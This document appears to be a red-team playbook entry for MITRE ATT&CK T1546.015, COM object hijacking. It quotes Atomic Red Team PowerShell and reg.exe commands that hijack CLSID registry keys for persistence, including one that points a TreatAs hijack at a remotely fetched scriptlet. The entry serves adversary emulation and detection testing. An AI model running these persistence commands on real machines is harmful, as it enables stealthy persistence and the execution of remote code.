---
name: "T1546.015_component-object-model-hijacking"
description: "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1546.015
  - privilege-escalation
  - persistence
  - windows
  - sub-technique
technique_id: "T1546.015"
tactic: "privilege-escalation"
all_tactics:
  - privilege-escalation
  - persistence
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1546/015"
tech_stack:
  - windows
cwe_ids:
  - CWE-269
chains_with:
  - T1546
  - T1546.001
  - T1546.002
  - T1546.003
  - T1546.004
  - T1546.005
  - T1546.006
  - T1546.007
  - T1546.008
  - T1546.009
  - T1546.010
  - T1546.011
  - T1546.012
  - T1546.013
  - T1546.014
  - T1546.016
  - T1546.017
  - T1546.018
prerequisites:
  - T1546
severity_boost:
  T1546: "Chain with T1546 for deeper attack path"
  T1546.001: "Chain with T1546.001 for deeper attack path"
  T1546.002: "Chain with T1546.002 for deeper attack path"
---

# T1546.015 Component Object Model Hijacking

> **Sub-technique of:** T1546

## High-Level Description

Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. References to various COM objects are stored in the Registry.

Adversaries may use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

One variation of COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata about COM objects, such as their interfaces and methods. Adversaries may modify Registry keys associated with TypeLibs to redirect legitimate COM object functionality to malicious scripts or payloads. Unlike traditional COM hijacking, which commonly uses local DLLs, this variation may leverage the "script:" moniker to execute remote scripts hosted on external servers. This approach enables stealthy execution of code while maintaining persistence, as the remote payload would be automatically downloaded whenever the hijacked COM object is accessed.

## Kill Chain Phase

- Privilege Escalation (TA0004)
- Persistence (TA0003)

**Platforms:** Windows

## What to Check

- [ ] Identify if Component Object Model Hijacking technique is applicable to target environment
- [ ] Check Windows systems for indicators of Component Object Model Hijacking
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: COM Hijacking - InprocServer32

This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.

Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/

**Supported Platforms:** windows

```powershell
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dllpath}"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
```

**Dependencies:**

- DLL For testing

### Atomic Test 2: Powershell Execute COM Object

Use the PowerShell to execute COM CLSID object.
Reference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/

**Supported Platforms:** windows

```powershell
$o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
$item = $o.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

### Atomic Test 3: COM Hijacking with RunDLL32 (Local Server Switch)

This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via "rundll32.exe -localserver [clsid]".
This method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection.
Reference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/
Upon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened.

**Supported Platforms:** windows

```powershell
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dll_path}"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
```

**Dependencies:**

- DLL For testing

### Atomic Test 4: COM hijacking via TreatAs

This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.
Then, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The
test is validated by running 'rundll32.exe -sta "AtomicTest"' to avoid logging out.

References:

https://youtu.be/3gz1QmiMhss?t=1251

https://github.com/enigma0x3/windows-operating-system-archaeology

**Supported Platforms:** windows

```powershell
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f

reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f

rundll32.exe -sta "AtomicTest"
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Component Object Model Hijacking by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1546.015 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Windows COM Hijacking Detection via Registry and DLL Load Correlation

## Risk Assessment

| Finding                                               | Severity | Impact               |
| ----------------------------------------------------- | -------- | -------------------- |
| Component Object Model Hijacking technique applicable | High     | Privilege Escalation |

## CWE Categories

| CWE ID  | Title                         |
| ------- | ----------------------------- |
| CWE-269 | Improper Privilege Management |

## References

- [Elastic COM Hijacking](https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com)
- [GDATA COM Hijacking](https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence)
- [Microsoft Component Object Model](https://msdn.microsoft.com/library/ms694363.aspx)
- [RELIAQUEST](https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique/)
- [Atomic Red Team - T1546.015](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1546.015)
- [MITRE ATT&CK - T1546.015](https://attack.mitre.org/techniques/T1546/015)
